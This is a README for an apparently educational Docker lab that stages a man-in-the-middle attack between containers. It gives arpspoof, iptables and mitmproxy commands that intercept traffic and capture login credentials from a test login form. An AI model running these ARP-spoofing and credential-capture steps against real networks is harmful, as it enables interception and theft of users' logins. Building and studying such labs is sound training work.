# Docker MITM Attack Demonstration

This guide explains how to run a Man-in-the-Middle (MITM) attack demonstration using Docker containers. The setup includes three containers:
- **Alice**: The victim (Firefox browser)
- **Bob**: The target server (HTTP server)
- **Eve**: The attacker (MITM proxy)

## Prerequisites

- Docker
- docker-compose

## Setup and Running

1. **Start the containers**:
   ```bash
   docker-compose up -d
   ```

2. **Verify containers are running**:
   ```bash
   docker ps
   ```
   You should see three containers: `mitm_alice`, `mitm_bob`, and `mitm_eve`

3. **Start the MITM attack**:

   Run these commands in sequence:
   ```bash
   # Open first terminal - Start ARP spoofing from Bob to Alice
   docker exec -it mitm_eve arpspoof -t 172.19.0.2 172.19.0.3

   # Open second terminal - Start ARP spoofing from Alice to Bob
   docker exec -it mitm_eve arpspoof -t 172.19.0.3 172.19.0.2

   # Open third terminal - Configure iptables and start mitmproxy
   docker exec -it mitm_eve /olicyber/add_iptables_rule.sh
   docker exec -it mitm_eve mitmproxy --mode transparent@8082 -s /olicyber/proxy.py
   ```

4. **Access the target website**:
   - Open your browser and navigate to http://localhost:5800
   - This will open Firefox running in the Alice container
   - In Firefox, navigate to http://bob/
   - You should see the ZAICO login form

## Testing the Attack

1. The original website shows a ZAICO login form
2. When the MITM attack is active:
   - All traffic between Alice and Bob passes through Eve
   - Any login credentials entered will be captured and displayed in the mitmproxy console
   - The page includes a hidden message indicating it has been compromised

## Stopping the Attack

1. **Stop mitmproxy**:
   - Press `q` in the mitmproxy terminal

2. **Stop ARP spoofing**:
   - Use Ctrl+C in both arpspoof terminal windows

3. **Remove iptables rules**:
   ```bash
   docker exec -it mitm_eve /olicyber/del_iptables_rule.sh
   ```

4. **Stop all containers** (optional):
   ```bash
   docker-compose down
   ```

## Troubleshooting

1. **If mitmproxy fails to start**:
   - Make sure no other process is using port 8082
   - Restart the Eve container:
     ```bash
     docker restart mitm_eve
     ```

2. **If ARP spoofing doesn't work**:
   - Verify container IP addresses:
     ```bash
     docker exec -it mitm_eve dig alice bob
     ```
   - Check if IP forwarding is enabled:
     ```bash
     docker exec -it mitm_eve sysctl net.ipv4.ip_forward
     ```

3. **If the website doesn't load**:
   - Clear Firefox's cache
   - Make sure you're accessing http://bob/ (not localhost)
   - Verify all containers are running:
     ```bash
     docker ps
     ```

## Security Notice

This demonstration is for educational purposes only. Using these techniques against real systems without authorization is illegal and unethical. 